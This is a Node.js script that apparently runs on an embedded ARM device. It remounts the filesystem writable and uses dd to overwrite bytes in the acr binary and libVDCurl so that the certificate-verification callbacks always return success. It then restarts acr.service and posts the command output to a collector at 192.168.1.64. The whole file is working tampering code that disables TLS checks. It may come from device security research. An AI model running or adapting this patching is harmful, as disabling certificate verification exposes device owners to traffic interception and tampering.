"use strict";
// audit85.js - patch ON-DISK binaries (avoids ARM I-cache incoherency of
// /proc/pid/mem code patches) and restart acr.
//   /usr/bin/acr              file off 0x86c08, 0x87c84  -> 01 20 70 47
//   /usr/lib/libVDCurl.so.0.9 file off 0xBC24 (=48164)   -> 01 20 70 47
// Then restart acr.service so it loads the patched binary fresh.
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 20000 }).slice(0, cap || 8000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
function trim(s) { return (s || "").trim(); }

var out = {};
out.started = new Date().toISOString();

// 0. make / writable if needed
out.mount_rw = sh("mount -o remount,rw / 2>&1; echo RC=$?", 200);
out.mount_usr = sh("mount -o remount,rw /usr 2>&1; echo RC=$?", 200);

// 1. stub file
sh("printf '\\x01\\x20\\x70\\x47' > /tmp/.p80stub", 100);

// 2. patch /usr/bin/acr on disk
var acrTargets = [
    { name: "acr.AcrControlVerifyCertCallback", off: 0x86c08 },
    { name: "acr.lws_VerifyCertCallback", off: 0x87c84 }
];
var acrRes = [];
acrTargets.forEach(function (t) {
    var offHex = "0x" + t.off.toString(16);
    var before = trim(sh("dd if=/usr/bin/acr bs=1 skip=$((0x" + t.off.toString(16) + ")) count=4 2>/dev/null | od -An -tx1", 120));
    var wr = trim(sh("dd if=/tmp/.p80stub of=/usr/bin/acr bs=1 seek=$((0x" + t.off.toString(16) + ")) count=4 conv=notrunc 2>&1 | tail -1", 120));
    var after = trim(sh("dd if=/usr/bin/acr bs=1 skip=$((0x" + t.off.toString(16) + ")) count=4 2>/dev/null | od -An -tx1", 120));
    acrRes.push({ name: t.name, off: offHex, before: before, write: wr, after: after, ok: after.indexOf("01 20 70 47") >= 0 });
});
out.acr_file_patch = acrRes;

// 3. patch libVDCurl.so.0.9 on disk
var vdBefore = trim(sh("dd if=/usr/lib/libVDCurl.so.0.9 bs=1 skip=$((0xBC24)) count=4 2>/dev/null | od -An -tx1", 120));
var vdWr = trim(sh("dd if=/tmp/.p80stub of=/usr/lib/libVDCurl.so.0.9 bs=1 seek=$((0xBC24)) count=4 conv=notrunc 2>&1 | tail -1", 120));
var vdAfter = trim(sh("dd if=/usr/lib/libVDCurl.so.0.9 bs=1 skip=$((0xBC24)) count=4 2>/dev/null | od -An -tx1", 120));
out.vdcurl_file_patch = { off: "0xBC24", before: vdBefore, write: vdWr, after: vdAfter, ok: vdAfter.indexOf("01 20 70 47") >= 0 };

// 4. md5s for the record
out.md5_acr = sh("md5sum /usr/bin/acr", 150);
out.md5_vd = sh("md5sum /usr/lib/libVDCurl.so.0.9", 150);

// 5. restart acr so it loads patched binary
out.restart = sh("systemctl restart acr.service 2>&1; echo RC=$?", 300);
sh("sleep 4", 100);
out.pidof = sh("pidof acr", 200);
out.svc = sh("systemctl status acr.service --no-pager 2>&1 | head -8", 800);

post("/p85_patch", out);
post("/p85_done", { started: out.started });
